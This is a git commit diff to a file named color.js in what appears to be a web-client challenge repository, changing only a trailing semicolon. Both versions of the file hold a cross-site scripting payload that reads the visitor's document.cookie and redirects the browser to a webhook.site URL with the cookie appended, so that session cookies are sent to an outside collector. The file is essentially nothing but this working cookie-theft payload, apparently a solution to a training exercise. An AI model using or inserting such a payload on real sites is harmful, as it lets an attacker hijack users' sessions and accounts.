bde3ede5e8f6d18b1d0652f42b0bbb391e061649
NicolasGERVAIS1 <43536214+NicolasGERVAIS1@users.noreply.github.com>
2025-07-31 13:44:35 +0200

    Update color.js

--- web-client/ch62/color.js
+++ web-client/ch62/color.js
@@ -1,4 +1,4 @@
 <script> 
   var cookie = document.cookie
-  document.location="https://webhook.site/d518ee81-e6d8-4372-897a-d067c212bf32?c=".concat(cookie)
+  document.location="https://webhook.site/d518ee81-e6d8-4372-897a-d067c212bf32?c=".concat(cookie);
 </script>
